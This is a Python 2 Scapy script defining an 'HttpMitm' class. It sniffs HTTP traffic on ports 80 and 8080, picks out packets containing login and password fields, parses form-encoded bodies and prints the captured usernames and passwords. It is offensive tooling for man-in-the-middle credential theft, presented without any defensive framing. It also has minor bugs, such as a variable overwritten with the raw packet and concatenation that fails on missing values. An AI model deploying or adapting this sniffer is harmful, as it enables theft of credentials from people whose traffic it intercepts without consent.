from scapy.all import *
from sys       import argv
from re        import *

from scapy.layers.inet import TCP
from urllib2   import unquote as url_unquote


class HttpMitm():

    def __init__(self):
        self.USELESS_HTTP_HEADERS = [
            "User-Agent",
            "Accept",
            "Accept-Language",
            "Accept-Encoding",
            "Connection",
            "Content-Length"
        ]
        self.HTTP_PORTS = (80, 8080)
        self.PASS_REGEX = re.compile(r"pass|pwd")


    def packer_filter_if_login_and_pass(self,packet):
        if TCP in packet and packet[TCP].dport in self.HTTP_PORTS:
            packet_string = str(packet).strip().lower()
            return ("login" in packet_string and self.PASS_REGEX.search(packet_string))
        return False

    def remove_http_headers_from_string(self,a_string, http_headers):
        new_string = ""
        http_headers_lowered = [header.lower() for header in http_headers]
        for line in unicode(a_string).splitlines():
            if not any(line.lower().startswith(http_header)
                    for http_header in http_headers_lowered):
                new_string += line + "\n"
        return new_string


    def remove_useless_http_headers_from_string(self,a_string):
        return self.remove_http_headers_from_string(a_string, self.USELESS_HTTP_HEADERS)


    def is_urlencoded_content_type(self,a_string):
        for line in unicode(a_string).splitlines():
            if line == "":
                return False

            line = line.lower()
            if line == "content-type: application/x-www-form-urlencoded":
                return True

        return False


    def get_content_of_string_http_packet(self,a_string):
        is_content = False
        content = ""
        for line in unicode(a_string).splitlines():
            if is_content:
                content += line + "\n"
            if line == "":
                is_content = True
        return content


    def get_parameter_value_of_urlencoded(self,a_url_encoded, a_parameter):
        param_pos = a_url_encoded.find(a_parameter + "=")
        if param_pos < 0:
            return None

        param_value = a_url_encoded[param_pos + len(a_parameter) + 1:]
        param_pos = param_value.find("&")
        if param_pos > 0:
            param_value = param_value[:param_pos]
        return url_unquote(param_value)


    def get_one_of_parameters_value_of_urlencoded(self,a_url_encoded, parameters):
        for a_parameter in parameters:
            value = self.get_parameter_value_of_urlencoded(a_url_encoded, a_parameter)
            if value is not None:
                return value
        return None

    def analyse(self,packet):
        if self.packer_filter_if_login_and_pass(packet):
            print("# Http Credentials analyse:\n")
            packet_string = packet[Raw].load
            packet_string = self.remove_useless_http_headers_from_string(packet)
            packet_string = self.remove_http_headers_from_string(packet_string,("GET", "POST", "Referer"))
            login_part = None
            password_part = None

            if self.is_urlencoded_content_type(packet_string):
                packet_content_string = self.get_content_of_string_http_packet(packet_string)
                login_part = self.get_one_of_parameters_value_of_urlencoded(packet_content_string,
                                                                       ("login", "user", "name"))
                password_part =self. get_one_of_parameters_value_of_urlencoded(packet_content_string,
                                                                          ("pass", "pwd"))
            else:
                login_position = packet_string.find("login")
                if login_position < 0:
                    login_position = packet_string.find("user")
                    if login_position < 0:
                        login_position = packet_string.find("name")
                if login_position >= 0:
                    login_part = packet_string[login_position:].split('\n', 1)[0]

                password_position = packet_string.find("pass")
                if password_position < 0:
                    password_position = packet_string.find("pwd")
                if password_position >= 0:
                    password_part = packet_string[password_position:].split('\n', 1)[0]

            print("Login:::  "+login_part)
            print("Password:::" +password_part)

